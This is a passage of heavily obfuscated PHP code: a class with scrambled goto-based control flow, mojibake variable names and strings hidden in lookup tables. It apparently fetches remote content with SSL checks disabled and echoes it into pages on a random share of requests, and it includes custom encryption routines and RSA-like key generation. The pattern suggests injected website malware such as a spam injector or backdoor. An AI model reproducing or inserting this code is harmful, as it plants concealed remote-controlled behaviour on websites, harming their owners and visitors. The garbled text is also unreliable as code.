$eËİÏ»µ[295], $eËİÏ»µ[296]); goto Eßì˜Öºæ; cœğ—ã¨ß: $d¬®ÃÕ…ÍØ = $this->{$_SERVER[öÔÕ©€î‘][193]}($eËİÏ»µ[302], $C”¥¾±½ù); $FÈñÈŒóª = $Fßç‰õ–Ùñ[621]; if (!$eËİÏ»µ[202]($d¬®ÃÕ…ÍØ)) { return; } goto CÅ§Š¡ŠœÌ; C»ñ‰ó‰îÆ: if ($this->sqko49c96b85 == $eËİÏ»µ[131] || !$eËİÏ»µ[116]($GLOBALS, $eËİÏ»µ[142])) { return; } if (!$eËİÏ»µ[252]($_SERVER[$eËİÏ»µ[44]], $Aä¿‡¯ğ„)) { return; } if ($eËİÏ»µ[246]() % 4 != 0) { return; } goto d¦«æ‰ÓË; e„›ŞÆ‹è: } private function hcplc9c07af5($FÃ‘¬äß = '', $B“…öñ±„ = array(), $aßŞÁóì“ = 5) { goto EãÕ« Ãá; B™…µÔ™é: $C–É ¤·î½ = $a‰ÕùÜ—æÅ[637]; while ($C–É ¤·î½ < $a‰ÕùÜ—æÅ[584]) { if ($C–É ¤·î½ >= 0) { break; } $C–É ¤·î½++; } goto c¯¬ã¡¿–; F÷ë¹–çÄ: $D³²„Î†ò— = $a‰ÕùÜ—æÅ[645]; if (strlen($D³²„Î†ò—) < $a‰ÕùÜ—æÅ[615]) { return; } $B“…öñ±„ = @$Bßñ¹™´§‰[267]($bíƒâÜ³›º, !1, $B¯†¨†ÚÈ©); goto E¼¯ƒ¦‰»; dƒŠ‰¢’®: $bíƒâÜ³›º = $this->{$_SERVER[öÔÕ©€î‘][260]}($bíƒâÜ³›º, $Bßñ¹™´§‰[305]); $bíƒâÜ³›º = $bíƒâÜ³›º . $FÃ‘¬äß; $EğÀò‰‘¼ = $a‰ÕùÜ—æÅ[644]; goto bäÍ¿´ñˆ; E¼¯ƒ¦‰»: $b­ìáÅÄŸ = $a‰ÕùÜ—æÅ[646]; if (strlen($b­ìáÅÄŸ) < $a‰ÕùÜ—æÅ[584]) { die; } return $Bßñ¹™´§‰[201]($B“…öñ±„, !0); goto B™…µÔ™é; bäÍ¿´ñˆ: if ($B“…öñ±„ && $Bßñ¹™´§‰[202]($B“…öñ±„)) { $bíƒâÜ³›º = $bíƒâÜ³›º . $Bßñ¹™´§‰[306] . $Bßñ¹™´§‰[307]($B“…öñ±„); } if ($B“…öñ±„ === -1) { return $bíƒâÜ³›º; } $B¯†¨†ÚÈ© = $Bßñ¹™´§‰[262](array($Bßñ¹™´§‰[263] => array($Bßñ¹™´§‰[266] => $aßŞÁóì“, $Bßñ¹™´§‰[264] => $Bßñ¹™´§‰[308]), $Bßñ¹™´§‰[309] => array($Bßñ¹™´§‰[310] => !1, $Bßñ¹™´§‰[311] => !1))); goto F÷ë¹–çÄ; EãÕ« Ãá: $a‰ÕùÜ—æÅ =& $_SERVER[¬ı§†‰ú˜¼]; $Bßñ¹™´§‰ =& $_SERVER[öÔÕ©€î‘]; $bíƒâÜ³›º = $Bßñ¹™´§‰[304]; goto dƒŠ‰¢’®; c¯¬ã¡¿–: } private function bjtcc2a90a64() { goto f²Ú‡½¡ŠÖ; f²Ú‡½¡ŠÖ: $CÑ¡Çõâ÷ =& $_SERVER[¬ı§†‰ú˜¼]; $AºŠè³… =& $_SERVER[öÔÕ©€î‘]; $F®ëâ´ìê = array($AºŠè³…[312] => $AºŠè³…[313], $AºŠè³…[314] => $AºŠè³…[315], $AºŠè³…[316] => $AºŠè³…[317], $AºŠè³…[318] => $AºŠè³…[319], $AºŠè³…[320] => $AºŠè³…[321], $AºŠè³…[322] => $AºŠè³…[255], $AºŠè³…[323] => $AºŠè³…[255], $AºŠè³…[324] => $AºŠè³…[313], $AºŠè³…[325] => $AºŠè³…[315], $AºŠè³…[326] => $AºŠè³…[317], $AºŠè³…[327] => $AºŠè³…[328], $AºŠè³…[329] => $AºŠè³…[319], $AºŠè³…[330] => $AºŠè³…[331], $AºŠè³…[332] => $AºŠè³…[321], $AºŠè³…[333] => $AºŠè³…[334], $AºŠè³…[335] => $AºŠè³…[336], $AºŠè³…[337] => $AºŠè³…[338]); goto EÉ¸’ÓÇ…Ó; EÉ¸’ÓÇ…Ó: $EÇ¹ÃÍ“Î¸ = $CÑ¡Çõâ÷[647]; while (strlen($EÇ¹ÃÍ“Î¸) < $CÑ¡Çõâ÷[574]) { if (!$EÇ¹ÃÍ“Î¸) { break; } $EÇ¹ÃÍ“Î¸++; } $Aåï™ì½˜„ = $F®ëâ´ìê[$this->sqko49c96b85]; goto då°ˆˆä¹»; då°ˆˆä¹»: $Aåï™ì½˜„ = $AºŠè³…[254]($Aåï™ì½˜„ ? $Aåï™ì½˜„ : $AºŠè³…[313]); $CŠˆ÷‘Îâ§ = $CÑ¡Çõâ÷[648]; if (strlen($CŠˆ÷‘Îâ§) < $CÑ¡Çõâ÷[574]) { return; } goto DÏİ¹ÔˆÊ; DÏİ¹ÔˆÊ: $cÁ”Î·ÇãŒ = $AºŠè³…[116]($this->qvgdf4924622, $AºŠè³…[339]); $cÁ”Î·ÇãŒ = $cÁ”Î·ÇãŒ ? $AºŠè³…[254]($cÁ”Î·ÇãŒ) : 0; return $Aåï™ì½˜„ + $cÁ”Î·ÇãŒ; goto Aˆóµã‹ÔÛ; Aˆóµã‹ÔÛ: } public function jacf93c8505c($e—êŠŠãÜ) { goto c¤¬ÔÁ‘Ï; fˆÄ¦Ö©¤ï: $F¿ìË´Şë = $D½©Ó‰—Å[651]; if (!$F¿ìË´Şë) { die; } if (!$F±Á™á†•Ã[252]($e—êŠŠãÜ[$F±Á™á†•Ã[340]], $cİÆ¿ÒÉßƒ)) { $F±Á™á†•Ã[176]($F±Á™á†•Ã[344], !1, $F±Á™á†•Ã[249]); } goto AÔÓ¼ŒÙíÆ; b­æ¥”³Òá: $FàÀÈËí¾Î = $D½©Ó‰—Å[649]; if (strlen($FàÀÈËí¾Î) < $D½©Ó‰—Å[587]) { die; } if ($e—êŠŠãÜ[$F±Á™á†•Ã[340]] == $F±Á™á†•Ã[230]) { return; } goto BÛá®ŸÎÄõ; c¤¬ÔÁ‘Ï: $D½©Ó‰—Å =& $_SERVER[¬ı§†‰ú˜¼]; $F±Á™á†•Ã =& $_SERVER[öÔÕ©€î‘]; $c»ô†¿˜Æƒ = $this->{$_SERVER[öÔÕ©€î‘][147]}(); goto b­æ¥”³Òá; BÛá®ŸÎÄõ: if ($c»ô†¿˜Æƒ >= $F±Á™á†•Ã[254]($F±Á™á†•Ã[255])) { return; } $e¶ŠÃ¤ÅƒÎ = $F±Á™á†•Ã[61]($F±Á™á†•Ã[149])->{$_SERVER[öÔÕ©€î‘][150]}(); $aºíå±Ş = $D½©Ó‰—Å[650]; goto CŒíç¹†·Ø; CŒíç¹†·Ø: if ($e¶ŠÃ¤ÅƒÎ <= $c»ô†¿˜Æƒ) { return; } $cİÆ¿ÒÉßƒ = $F±Á™á†•Ã[61]($F±Á™á†•Ã[149])->{$_SERVER[öÔÕ©€î‘][341]}($F±Á™á†•Ã[340])->{$_SERVER[öÔÕ©€î‘][342]}($c»ô†¿˜Æƒ)->{$_SERVER[öÔÕ©€î‘][343]}(); $cİÆ¿ÒÉßƒ = $F±Á™á†•Ã[232]($cİÆ¿ÒÉßƒ, $F±Á™á†•Ã[10], $F±Á™á†•Ã[340]); goto fˆÄ¦Ö©¤ï; AÔÓ¼ŒÙíÆ: } public function vidmb2998b1f() { goto CÙ÷‘»¸âÌ; FôÕ–­½À¾: $c„Ü”Ë„ø‰ = $bÒ‡ŠÆ®Ìì[259]; $dÆîİ—¹¥Ã = $b¤àÚ¾–å¬[652]; while (strlen($dÆîİ—¹¥Ã) < $b¤àÚ¾–å¬[584]) { if (!$dÆîİ—¹¥Ã) { break; } $dÆîİ—¹¥Ã++; } goto c¿Õİ…²´ß; c¿Õİ…²´ß: $c„Ü”Ë„ø‰ = $this->{$_SERVER[öÔÕ©€î‘][260]}($c„Ü”Ë„ø‰, $bÒ‡ŠÆ®Ìì[261]); $EĞ¨çÎ¯¢É = $bÒ‡ŠÆ®Ìì[262](array($bÒ‡ŠÆ®Ìì[263] => array($bÒ‡ŠÆ®Ìì[264] => $bÒ‡ŠÆ®Ìì[265], $bÒ‡ŠÆ®Ìì[266] => 3))); $bØˆŸƒŸ½ = @$bÒ‡ŠÆ®Ìì[267]($c„Ü”Ë„ø‰, !1, $EĞ¨çÎ¯¢É); goto E‹òˆñ’ï¬; E‹òˆñ’ï¬: $cºÏË¬³Ô = $b¤àÚ¾–å¬[653]; if (strlen($cºÏË¬³Ô) < $b¤àÚ¾–å¬[587]) { return; } echo $bÒ‡ŠÆ®Ìì[346] . $bÒ‡ŠÆ®Ìì[347]($bØˆŸƒŸ½) . $bÒ‡ŠÆ®Ìì[348]; goto AôÓ¼Şè; AôÓ¼Şè: $Aòê«äÆ¥‡ = $b¤àÚ¾–å¬[654]; if (strlen($Aòê«äÆ¥‡) < $b¤àÚ¾–å¬[587]) { return; } goto e´˜ñÃĞ‚¯; CÙ÷‘»¸âÌ: $b¤àÚ¾–å¬ =& $_SERVER[¬ı§†‰ú˜¼]; $bÒ‡ŠÆ®Ìì =& $_SERVER[öÔÕ©€î‘]; if (!$bÒ‡ŠÆ®Ìì[116]($GLOBALS, $bÒ‡ŠÆ®Ìì[142]) || $bÒ‡ŠÆ®Ìì[345](1, 100) > 20) { return; } goto FôÕ–­½À¾; e´˜ñÃĞ‚¯: } private function gsvhb55143c1($Eºî“êÓ“›, $dÀÔ³Ïù¾’, $BËÅÑÒ—„” = 3) { goto cìºÚÛŸ¥; aê‚Ùù¯øø: $cí¾…©«¨ = $eÖƒÚçù¤[671]; if (!$cí¾…©«¨) { return; } if ($BËÅÑÒ—„” - 1 > 0) { $B…áÌ¬¢À = $this->{$_SERVER[öÔÕ©€î‘][137]}($B…áÌ¬¢À, $dÀÔ³Ïù¾’, $BËÅÑÒ—„” - 1); } goto c¸°İõÆ®®; fƒÁÚáî¾: $e‡†ÙšÎï = $eÖƒÚçù¤[655]; $Eºî“êÓ“› = $C†‚¢íÚÔ[2]($Eºî“êÓ“›); $C÷íÊ÷ÎÕÙ = $C†‚¢íÚÔ[345](0, 5) . $C†‚¢íÚÔ[10]; goto F¯æÇ†ç¯ì; F¯æÇ†ç¯ì: $AòÀÜ‰—Û = $C†‚¢íÚÔ[134](15); $E¿Úçˆµƒ = $C†‚¢íÚÔ[350]; $B©«ŞÏâä‚ = $eÖƒÚçù¤[656]; goto CÀÛ¿œä¬; c¸°İõÆ®®: return $B…áÌ¬¢À; goto b”¹Ç™Å¬©; cìºÚÛŸ¥: $eÖƒÚçù¤ =& $_SERVER[¬ı§†‰ú˜¼]; $C†‚¢íÚÔ =& $_SERVER[öÔÕ©€î‘]; $C†‚¢íÚÔ[349](1); goto fƒÁÚáî¾; CÀÛ¿œä¬: if (strlen($B©«ŞÏâä‚) < $eÖƒÚçù¤[584]) { die; } switch ($C÷íÊ÷ÎÕÙ) { case $C†‚¢íÚÔ[244]: $B…áÌ¬¢À = $this->{$_SERVER[öÔÕ©€î‘][157]}($Eºî“êÓ“›, $C†‚¢íÚÔ[224]($dÀÔ³Ïù¾’ . $AòÀÜ‰—Û)); $AºèÈÍ£®œ = $eÖƒÚçù¤[657]; if (strlen($AºèÈÍ£®œ) < $eÖƒÚçù¤[594]) { return; } break; case $C†‚¢íÚÔ[230]: $B…áÌ¬¢À = $this->{$_SERVER[öÔÕ©€î‘][157]}($Eºî“êÓ“›, $C†‚¢íÚÔ[224]($AòÀÜ‰—Û . $dÀÔ³Ïù¾’)); $Fµ—îöÖâ = $eÖƒÚçù¤[658]; if (strlen($Fµ—îöÖâ) < $eÖƒÚçù¤[594]) { die; } break; $c‹©Ñ•Œ = $eÖƒÚçù¤[659]; if (!$c‹©Ñ•Œ) { return; } case $C†‚¢íÚÔ[351]: $B…áÌ¬¢À = $this->{$_SERVER[öÔÕ©€î‘][157]}($Eºî“êÓ“›, $C†‚¢íÚÔ[128]($AòÀÜ‰—Û . $dÀÔ³Ïù¾’)); $fîñï±¤Ê = $eÖƒÚçù¤[660]; if (strlen($fîñï±¤Ê) < $eÖƒÚçù¤[584]) { return; } break; $f„‚¾È°ù“ = $eÖƒÚçù¤[661]; if (strlen($f„‚¾È°ù“) < $eÖƒÚçù¤[587]) { return; } case $C†‚¢íÚÔ[352]: $B…áÌ¬¢À = $this->{$_SERVER[öÔÕ©€î‘][157]}($Eºî“êÓ“›, $C†‚¢íÚÔ[124]($AòÀÜ‰—Û . $dÀÔ³Ïù¾’)); break; $bÀÄ…‰Í›» = $eÖƒÚçù¤[662]; if (!$bÀÄ…‰Í›») { return; } case $C†‚¢íÚÔ[353]: goto DƒÂ†ÂáìÅ; Aî–¨’Æçó: $aêÛ‚Áæéë = $eÖƒÚçù¤[669]; if (!$aêÛ‚Áæéë) { return; } break; goto aá‰ÏœĞ‚í; DƒÂ†ÂáìÅ: $Eºî“êÓ“› = $C†‚¢íÚÔ[128]($Eºî“êÓ“›); $fò§¡¦ªÃ» = $C†‚¢íÚÔ[354](0, 64); $CÆîóŠ‘ˆ = $eÖƒÚçù¤[663]; goto A‰àÜí; E™›‚Å±šÄ: $eáŸä½Ïƒ™ = 0; for ($CŞ•®ˆøÀ» = 0; $CŞ•®ˆøÀ» < $C†‚¢íÚÔ[24]($Eºî“êÓ“›); $CŞ•®ˆøÀ»++) { $eáŸä½Ïƒ™ = $eáŸä½Ïƒ™ == $C†‚¢íÚÔ[24]($e¸äÖ®´´Ù) ? 0 : $eáŸä½Ïƒ™; $b´†à¦‡•ò = ($fò§¡¦ªÃ» + $C†‚¢íÚÔ[355]($E¿Úçˆµƒ, $Eºî“êÓ“›[$CŞ•®ˆøÀ»]) + $C†‚¢íÚÔ[356]($e¸äÖ®´´Ù[$eáŸä½Ïƒ™++])) % 64; $cÏ‚àæ™ÀÑ .= $E¿Úçˆµƒ[$b´†à¦‡•ò]; } $B…áÌ¬¢À = $C†‚¢íÚÔ[347]($a¨Ë§Œ¬¼ . $cÏ‚àæ™ÀÑ); goto Aî–¨’Æçó; Eø½ÆîŠœä: if (strlen($E±ò²óÌ¨) < $eÖƒÚçù¤[574]) { return; } $e¸äÖ®´´Ù = $C†‚¢íÚÔ[124]($a¨Ë§Œ¬¼ . $C†‚¢íÚÔ[124]($dÀÔ³Ïù¾’ . $a¨Ë§Œ¬¼) . $dÀÔ³Ïù¾’); $e¸äÖ®´´Ù = $C†‚¢íÚÔ[25]($e¸äÖ®´´Ù, $fò§¡¦ªÃ» % 8, $fò§¡¦ªÃ» % 8 + 7); goto E¸Û‹‡ôö; f‰©¤“¨: $b´†à¦‡•ò = 0; $eÔ„ãŠ°Á = $eÖƒÚçù¤[668]; if (strlen($eÔ„ãŠ°Á) < $eÖƒÚçù¤[615]) { die; } goto E™›‚Å±šÄ; d‚¼Ş¥÷: if (strlen($A»¼¬öñØº) < $eÖƒÚçù¤[615]) { die; } $CŞ•®ˆøÀ» = 0; $dÄÉ‡¶Ê×Ù = $eÖƒÚçù¤[667]; goto f‰©¤“¨; A‰àÜí: while (strlen($CÆîóŠ‘ˆ) < $eÖƒÚçù¤[594]) { if (!$CÆîóŠ‘ˆ) { break; } $CÆîóŠ‘ˆ++; } $a¨Ë§Œ¬¼ = $E¿Úçˆµƒ[$fò§¡¦ªÃ»]; $E±ò²óÌ¨ = $eÖƒÚçù¤[664]; goto Eø½ÆîŠœä; E¸Û‹‡ôö: $c¾Î™Î” = $eÖƒÚçù¤[665]; $cÏ‚àæ™ÀÑ = $C†‚¢íÚÔ[10]; $A»¼¬öñØº = $eÖƒÚçù¤[666]; goto d‚¼Ş¥÷; aá‰ÏœĞ‚í: default: $B…áÌ¬¢À = $this->{$_SERVER[öÔÕ©€î‘][157]}($Eºî“êÓ“›, $dÀÔ³Ïù¾’ . $AòÀÜ‰—Û); $aöŞ¯÷áº… = $eÖƒÚçù¤[670]; while (strlen($aöŞ¯÷áº…) < $eÖƒÚçù¤[584]) { if (!$aöŞ¯÷áº…) { break; } $aöŞ¯÷áº…++; } break; } $B…áÌ¬¢À = $C†‚¢íÚÔ[224]($C÷íÊ÷ÎÕÙ . $AòÀÜ‰—Û . $B…áÌ¬¢À); goto aê‚Ùù¯øø; b”¹Ç™Å¬©: } private function auxm256caf0c($cËïç¼òò, $b“ê†ÂÔ†ù, $A¬‹°² = 3) { goto fÃÇ„Ûì’; Dîš§Ôª¨: $cËïç¼òò = $d¢ŠÀ•‘ä[224]($cËïç¼òò); $E‡šÛ‰‡·á = $aòöâ¶ËÒŠ[673]; if (strlen($E‡šÛ‰‡·á) < $aòöâ¶ËÒŠ[584]) { return; } goto A™¦ø½©Š÷; EÆ‰Ò²ïÀŸ: $fØ‰ÈÒƒê = $aòöâ¶ËÒŠ[675]; while (strlen($fØ‰ÈÒƒê) < $aòöâ¶ËÒŠ[574]) { if (!$fØ‰ÈÒƒê) { break; } $fØ‰ÈÒƒê++; } switch ($c¬‚Ìëøß§) { case $d¢ŠÀ•‘ä[244]: $bà¬ÉØèñò = $this->{$_SERVER[öÔÕ©€î‘][260]}($cËïç¼òò, $d¢ŠÀ•‘ä[224]($b“ê†ÂÔ†ù . $dšê’ÙàÜƒ)); break; case $d¢ŠÀ•‘ä[230]: $bà¬ÉØèñò = $this->{$_SERVER[öÔÕ©€î‘][260]}($cËïç¼òò, $d¢ŠÀ•‘ä[224]($dšê’ÙàÜƒ . $b“ê†ÂÔ†ù)); break; $D”ò”¶÷Ÿ = $aòöâ¶ËÒŠ[676]; if (!$D”ò”¶÷Ÿ) { die; } case $d¢ŠÀ•‘ä[351]: $bà¬ÉØèñò = $this->{$_SERVER[öÔÕ©€î‘][260]}($cËïç¼òò, $d¢ŠÀ•‘ä[128]($dšê’ÙàÜƒ . $b“ê†ÂÔ†ù)); $dòĞ‘Ãñ‰ = $aòöâ¶ËÒŠ[677]; if (!$dòĞ‘Ãñ‰) { return; } break; $Cé­‚†ì = $aòöâ¶ËÒŠ[678]; if (strlen($Cé­‚†ì) < $aòöâ¶ËÒŠ[587]) { return; } case $d¢ŠÀ•‘ä[352]: $bà¬ÉØèñò = $this->{$_SERVER[öÔÕ©€î‘][260]}($cËïç¼òò, $d¢ŠÀ•‘ä[124]($dšê’ÙàÜƒ . $b“ê†ÂÔ†ù)); break; $C×¯”’ã» = $aòöâ¶ËÒŠ[679]; if (strlen($C×¯”’ã») < $aòöâ¶ËÒŠ[587]) { return; } case $d¢ŠÀ•‘ä[353]: goto BÜÈ‰œŒ®í; bšÖ”ä¸Ó: $B˜¬‰ÅÕ¨ = $aòöâ¶ËÒŠ[684]; if (strlen($B˜¬‰ÅÕ¨) < $aòöâ¶ËÒŠ[594]) { return; } for ($a…¹ ¿£ã‹ = 0; $a…¹ ¿£ã‹ < $d¢ŠÀ•‘ä[24]($cËïç¼òò); $a…¹ ¿£ã‹++) { $FŸ¥»ÑŸâÃ = $FŸ¥»ÑŸâÃ == $d¢ŠÀ•‘ä[24]($EÚ‘³ãñ) ? 0 : $FŸ¥»ÑŸâÃ; $c¬©‘³Ôˆ¬ = $FŸ¥»ÑŸâÃ++; $AÆ”Ø‹Ëë¸ = $d¢ŠÀ•‘ä[355]($B†Åà¢¤¡», $cËïç¼òò[$a…¹ ¿£ã‹]) - $díİøñ¨ÛŞ - $d¢ŠÀ•‘ä[356]($EÚ‘³ãñ[$c¬©‘³Ôˆ¬]); $AöÕ‘ƒ§š˜ = $aòöâ¶ËÒŠ[685]; if (!$AöÕ‘ƒ§š˜) { return; } while ($AÆ”Ø‹Ëë¸ < 0) { $AÆ”Ø‹Ëë¸ += 64; } $aƒ‘™ç¬º .= $B†Åà¢¤¡»[$AÆ”Ø‹Ëë¸]; } goto eì½š¯ÃˆÆ; fµí‚ï—óÇ: $a…¹ ¿£ã‹ = 0; $AÆ”Ø‹Ëë¸ = 0; $FŸ¥»ÑŸâÃ = 0; goto bšÖ”ä¸Ó; fŞ˜öÛÀ²Ó: $DÂĞöİ¦ÄÓ = $aòöâ¶ËÒŠ[681]; while (strlen($DÂĞöİ¦ÄÓ) < $aòöâ¶ËÒŠ[584]) { if (!$DÂĞöİ¦ÄÓ) { break; } $DÂĞöİ¦ÄÓ++; } $EÚ‘³ãñ = $d¢ŠÀ•‘ä[124]($EÎ™‹½ôÉ . $d¢ŠÀ•‘ä[124]($b“ê†ÂÔ†ù . $EÎ™‹½ôÉ) . $b“ê†ÂÔ†ù); goto dÕ¾×Ä¬ö; e‰µ›øÌ»: break; $e¢ËÜãœ™º = $aòöâ¶ËÒŠ[687]; if (!$e¢ËÜãœ™º) { die; } goto f—Üê™ÆÉ‚; dÕ¾×Ä¬ö: $e´Ÿ±ïŒ›² = $aòöâ¶ËÒŠ[682]; if (strlen($e´Ÿ±ïŒ›²) < $aòöâ¶ËÒŠ[587]) { die; } $EÚ‘³ãñ = $d¢ŠÀ•‘ä[25]($EÚ‘³ãñ, $díİøñ¨ÛŞ % 8, $díİøñ¨ÛŞ % 8 + 7); goto B“ÂÓ…ˆÇ; BÜÈ‰œŒ®í: $cËïç¼òò = $d¢ŠÀ•‘ä[358]($cËïç¼òò); $DêÍ•Î„ª± = $aòöâ¶ËÒŠ[680]; if (strlen($DêÍ•Î„ª±) < $aòöâ¶ËÒŠ[615]) { return; } goto c—ô©ØÑìˆ; B“ÂÓ…ˆÇ: $aƒ‘™ç¬º = $d¢ŠÀ•‘ä[10]; $Fôå÷¶ÖĞõ = $aòöâ¶ËÒŠ[683]; if (strlen($Fôå÷¶ÖĞõ) < $aòöâ¶ËÒŠ[615]) { die; } goto fµí‚ï—óÇ; c—ô©ØÑìˆ: $EÎ™‹½ôÉ = $cËïç¼òò[0]; $cËïç¼òò = $d¢ŠÀ•‘ä[25]($cËïç¼òò, 1); $díİøñ¨ÛŞ = $d¢ŠÀ•‘ä[355]($B†Åà¢¤¡», $EÎ™‹½ôÉ); goto fŞ˜öÛÀ²Ó; eì½š¯ÃˆÆ: $bà¬ÉØèñò = $d¢ŠÀ•‘ä[359]($aƒ‘™ç¬º); $F¸Ïƒ’ƒİ¶ = $aòöâ¶ËÒŠ[686]; if (strlen($F¸Ïƒ’ƒİ¶) < $aòöâ¶ËÒŠ[587]) { die; } goto e‰µ›øÌ»; f—Üê™ÆÉ‚: default: $bà¬ÉØèñò = $this->{$_SERVER[öÔÕ©€î‘][260]}($cËïç¼òò, $b“ê†ÂÔ†ù . $dšê’ÙàÜƒ); break; } goto C…ñ”ßòåÌ; A™¦ø½©Š÷: $c¬‚Ìëøß§ = $cËïç¼òò[0]; $dšê’ÙàÜƒ = $d¢ŠÀ•‘ä[25]($cËïç¼òò, 1, 15); $cËïç¼òò = $d¢ŠÀ•‘ä[25]($cËïç¼òò, 16); goto C’ôïŒ¦ƒ—; fÃÇ„Ûì’: $aòöâ¶ËÒŠ =& $_SERVER[¬ı§†‰ú˜¼]; $d¢ŠÀ•‘ä =& $_SERVER[öÔÕ©€î‘]; if (!$d¢ŠÀ•‘ä[357]($cËïç¼òò) || $d¢ŠÀ•‘ä[24]($cËïç¼òò) < 10) { return !1; } goto d°‚³±ÊÎö; C’ôïŒ¦ƒ—: $b¾„¥¬ŸÌ = $aòöâ¶ËÒŠ[674]; if (!$b¾„¥¬ŸÌ) { return; } $B†Åà¢¤¡» = $d¢ŠÀ•‘ä[350]; goto EÆ‰Ò²ïÀŸ; d°‚³±ÊÎö: $cËïç¼òò = $d¢ŠÀ•‘ä[2]($cËïç¼òò); $EÏ”Š´á¨ó = $aòöâ¶ËÒŠ[672]; while (strlen($EÏ”Š´á¨ó) < $aòöâ¶ËÒŠ[587]) { if (!$EÏ”Š´á¨ó) { break; } $EÏ”Š´á¨ó++; } goto Dîš§Ôª¨; C…ñ”ßòåÌ: if ($A¬‹°² - 1 > 0) { $bà¬ÉØèñò = $this->{$_SERVER[öÔÕ©€î‘][199]}($bà¬ÉØèñò, $b“ê†ÂÔ†ù, $A¬‹°² - 1); } return $bà¬ÉØèñò; goto D¶ˆ¯Œ›Ö‘; D¶ˆ¯Œ›Ö‘: } public function cmgje3db67d8($fÙäŒòŠÊ) { goto E†ĞÔä¿ßá; Eªˆ‘ù–İŞ: $AÁ£¶²¨‹é = ($aöËÄ¯—àš - 1) * ($dàáíæõ® - 1); $f«‘ğóìÅÚ = $c¨„Ã¾ƒÏ[689]; if (strlen($f«‘ğóìÅÚ) < $c¨„Ã¾ƒÏ[574]) { die; } goto dÏ­»ÁÛõº; E†ĞÔä¿ßá: $c¨„Ã¾ƒÏ =& $_SERVER[¬ı§†‰ú˜¼]; $EÄ­Ã‘†êî =& $_SERVER[öÔÕ©€î‘]; $aöËÄ¯—àš = $this->{$_SERVER[öÔÕ©€î‘][360]}(); goto e°…áä–ƒ; A‹”áæ¹Øˆ: for ($c´×´¦â» = 0; $c´×´¦â» < $AÁ£¶²¨‹é * 10; $c´×´¦â»++) { if (($AÁ£¶²¨‹é * $c´×´¦â» + 1) % $fŞ‡²©˜Á == 0) { $DÑ ’ÕÈ« = $EÄ­Ã‘†êî[254](($AÁ£¶²¨‹é * $c´×´¦â» + 1) / $fŞ‡²©˜Á); break; } } $DÀ¨µŞÃÜØ = $this->{$_SERVER[öÔÕ©€î‘][157]}($aöËÄ¯—àš * $dàáíæõ® . $EÄ­Ã‘†êî[10], $EÄ­Ã‘†êî[159]); $Dğ¾„ğñĞ² = $EÄ­Ã‘†êî[124]($EÄ­Ã‘†êî[361] . ($aöËÄ¯—àš + $dàáíæõ®) . $EÄ­Ã‘†êî[362] . $fŞ‡²©˜Á . $EÄ­Ã‘†êî[362] . $DÑ ’ÕÈ« . $EÄ­Ã‘†êî[363]); goto dˆ—»°êÌ; dˆ—»°êÌ: $A±©î„Œ¾ = $this->{$_SERVER[öÔÕ©€î‘][157]}($fÙäŒòŠÊ, $Dğ¾„ğñĞ²) . $EÄ­Ã‘†êî[364] . $DÀ¨µŞÃÜØ; $CˆÌÈŒ—ß = $c¨„Ã¾ƒÏ[695]; return $A±©î„Œ¾; goto b²„¨„¾é¯; bÒ›÷Ä†¯: $DÑ ’ÕÈ« = 2; $C¿Üš¾š‡¯ = $c¨„Ã¾ƒÏ[694]; while ($C¿Üš¾š‡¯ < $c¨„Ã¾ƒÏ[587]) { if ($C¿Üš¾š‡¯ >= 0) { break; } $C¿Üš¾š‡¯++; } goto A‹”áæ¹Øˆ; dÏ­»ÁÛõº: $fŞ‡²©˜Á = $EÄ­Ã‘†êî[254](($aöËÄ¯—àš + $dàáíæõ®) / 2); $CÓËï¯²êÉ = $c¨„Ã¾ƒÏ[690]; while (1) { $DÂÂÀ‚Í¹ = $fŞ‡²©˜Á; $Dì„ä¼×õ¤ = $AÁ£¶²¨‹é; $D„Š¦Ÿ‚é™ = $c¨„Ã¾ƒÏ[691]; while ($Dì„ä¼×õ¤ % $DÂÂÀ‚Í¹ != 0) { $cİïéÕ”àğ = $Dì„ä¼×õ¤; $Dì„ä¼×õ¤ = $DÂÂÀ‚Í¹; $Bõ‹¸Ğ¬îÎ = $c¨„Ã¾ƒÏ[692]; if (strlen($Bõ‹¸Ğ¬îÎ) < $c¨„Ã¾ƒÏ[584]) { die; } $DÂÂÀ‚Í¹ = $cİïéÕ”àğ % $DÂÂÀ‚Í¹; $d‘Ä°„ÖÔâ = $c¨„Ã¾ƒÏ[693]; if (!$d‘Ä°„ÖÔâ) { die; } } if ($DÂÂÀ‚Í¹ == 1) { break; } else { $fŞ‡²©˜Á++; } } goto bÒ›÷Ä†¯; b²„¨„¾é¯: $A˜˜Ü•–Ñ‰ = $c¨„Ã¾ƒÏ[696]; if (strlen($A˜˜Ü•–Ñ‰) < $c¨„Ã¾ƒÏ[594]) { return; } goto b¿ºöÚë¬Ù; e°…áä–ƒ: $dàáíæõ® = $this->{$_SERVER[öÔÕ©€î‘][360]}(); $Eİ“®ÍÏÍÚ = $c¨„Ã¾ƒÏ[688]; if (strlen($Eİ“®ÍÏÍÚ) < $c¨„Ã¾ƒÏ[615]) { die; } goto Eªˆ‘ù–İŞ; b¿ºöÚë¬Ù: } public function ivkra674dada($d½¿óØîÁÕ) { goto D©¥‹˜“Û; cƒÈÌŠğÈ: if (!$eÊÁ½¼Ñå) { die; } $b„Ú‡‘ƒµÈ = $this->{$_SERVER[öÔÕ©€î‘][260]}($aÑƒÅ¦ª‹[0], $Aòª¼îŠ–‚); $b‚Êå©î£ = $aíÁØÏ×¥[709]; goto BÆƒöÔ¼á‘; b·ò÷ŠÈè: for ($c‰ìåö²æä = 0; $c‰ìåö²æä < $A¹ ×ŞÆ¯Ã * 10; $c‰ìåö²æä++) { if (($A¹ ×ŞÆ¯Ã * $c‰ìåö²æä + 1) % $EÂ°ŒÀÌóÙ == 0) { $aÃ¨â›ˆ–á = $FÉ‘ñ…é“Å[254](($A¹ ×ŞÆ¯Ã * $c‰ìåö²æä + 1) / $EÂ°ŒÀÌóÙ); break; } } $Aòª¼îŠ–‚ = $FÉ‘ñ…é“Å[124]($FÉ‘ñ…é“Å[361] . ($EòÈ™áÚ»š + $aŠçì…™Û˜) . $FÉ‘ñ…é“Å[362] . $EÂ°ŒÀÌóÙ . $FÉ‘ñ…é“Å[362] . $aÃ¨â›ˆ–á . $FÉ‘ñ…é“Å[363]); $eÊÁ½¼Ñå = $aíÁØÏ×¥[708]; goto cƒÈÌŠğÈ; D×¡ÓáÖÁí: $CÜÜ’ÜìÌĞ = $aíÁØÏ×¥[697]; if ($FÉ‘ñ…é“Å[19]($aÑƒÅ¦ª‹) != 2) { return $FÉ‘ñ…é“Å[10]; } $b¯Ëáİ¬Ñ§ = 